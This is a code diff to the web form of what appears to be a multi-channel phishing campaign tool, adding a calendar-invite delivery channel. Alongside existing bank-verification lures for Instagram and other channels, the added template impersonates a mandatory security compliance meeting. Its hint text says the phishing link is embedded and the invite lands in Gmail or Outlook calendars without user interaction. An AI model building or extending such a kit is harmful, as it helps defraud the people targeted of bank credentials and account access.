@@ -125,6 +125,12 @@
                             <label for="chInstagram" class="channel-label">📸 Instagram</label>
                         </div>
                     </div>
+                    <div class="col-6 col-md-4">
+                        <div class="channel-toggle">
+                            <input type="checkbox" name="use_calendar" value="1" id="chCalendar" class="d-none">
+                            <label for="chCalendar" class="channel-label">📅 Calendar Invite</label>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -184,6 +190,22 @@ Best regards,
                         <textarea name="instagram_body" class="form-control" rows="3">Important: Your {{bank}} account needs verification. Link in bio: {{link}}</textarea>
                     </div>
                 </div>
+
+                <!-- Calendar Invite Template -->
+                <div id="calendarTemplate" style="display:none;">
+                    <div class="mb-3">
+                        <label class="form-label">📅 Meeting Title</label>
+                        <input type="text" name="calendar_summary" class="form-control"
+                               value="Mandatory: Annual Security Compliance Review">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">📅 Meeting Description</label>
+                        <textarea name="calendar_description" class="form-control" rows="3">Dear {{name}}, you are invited to a mandatory security compliance review. Please join using the link below. This meeting is required by company policy.
+
+Join: {{link}}</textarea>
+                    </div>
+                    <div class="template-hint">The phishing link ({{link}}) is automatically embedded in the calendar event. The invite auto-adds to Gmail/Outlook without user interaction.</div>
+                </div>
             </div>
 
             <div class="d-flex justify-content-between align-items-center">
@@ -219,6 +241,8 @@ Best regards,
                 const otherChecked = ['chWhatsapp','chTelegram','chDiscord','chInstagram'].some(
                     id => document.getElementById(id).checked);
                 document.getElementById('otherTemplates').style.display = otherChecked ? 'block' : 'none';
+                document.getElementById('calendarTemplate').style.display =
+                    document.getElementById('chCalendar').checked ? 'block' : 'none';
             });
             // Init
             if (cb.checked) cb.dispatchEvent(new Event('change'));
@@ -245,7 +269,7 @@ Best regards,
             const formData = new FormData(e.target);
 
             // Set checkbox values properly
-            ['use_email','use_sms','use_whatsapp','use_telegram','use_discord','use_instagram'].forEach(name => {
+            ['use_email','use_sms','use_whatsapp','use_telegram','use_discord','use_instagram','use_calendar'].forEach(name => {
                 if (!formData.has(name)) formData.set(name, '0');
                 else formData.set(name, '1');
             });
